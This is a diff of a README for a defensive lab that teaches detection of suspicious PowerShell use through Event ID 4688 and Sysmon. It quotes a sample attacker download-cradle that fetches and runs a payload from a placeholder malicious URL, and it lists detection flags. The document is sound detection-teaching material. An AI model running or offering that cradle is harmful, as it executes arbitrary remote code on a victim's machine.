@@ -1,10 +1,10 @@
-# Case1 Suspicious PowerShell Execution
+# Case 1 – Suspicious PowerShell Execution Detection
 
 This lab demonstrates how to detect suspicious PowerShell activity using Windows Event Logs and Sysmon.
 
 ## Lab Scenario
 
-An attacker executes a PowerShell command that downloads and executes a malicious payload.
+An attacker executes a malicious PowerShell command that downloads and executes a remote payload.
 
 Example:
 
@@ -13,11 +13,11 @@ powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://malicio
 ## Detection Sources
 
 - Windows Security Log (Event ID 4688)
-- Sysmon Event ID 1 (Process Creation)
+- Sysmon Event ID 1 – Process Creation
 
 ## Detection Logic
 
-Alert when PowerShell runs with suspicious parameters:
+Alert when PowerShell runs with suspicious parameters such as:
 
 - -nop
 - -enc
@@ -26,8 +26,7 @@ Alert when PowerShell runs with suspicious parameters:
 
 ## MITRE ATT&CK
 
-Technique: T1059.001  
-PowerShell
+Technique: **T1059.001 – PowerShell**
 
 ## Tools Used
 
@@ -35,13 +34,11 @@ PowerShell
 - Sysmon
 - Event Viewer
 
-  ## Detection Rule
+## Detection Rule
 
-This attack can be detected by monitoring Windows Event ID 4688 and looking for PowerShell execution with the following indicators:
+This attack can be detected by monitoring **Windows Event ID 4688** and looking for PowerShell execution with suspicious command-line arguments.
 
-- EncodedCommand
-- NoProfile
-- Hidden window style
+## Lab Steps
 
 ### Step 1 – Encode PowerShell Command
 ![Step1](screenshots1.jpg)
@@ -52,7 +49,7 @@ This attack can be detected by monitoring Windows Event ID 4688 and looking for 
 ### Step 3 – PowerShell Execution
 ![Step3](screenshots3.jpg)
 
-### Step 4 –PowerShell Execution
+### Step 4 – PowerShell Execution Details
 ![Step4](screenshots4.jpg)
 
 ### Step 5 – Event 4688 Generated
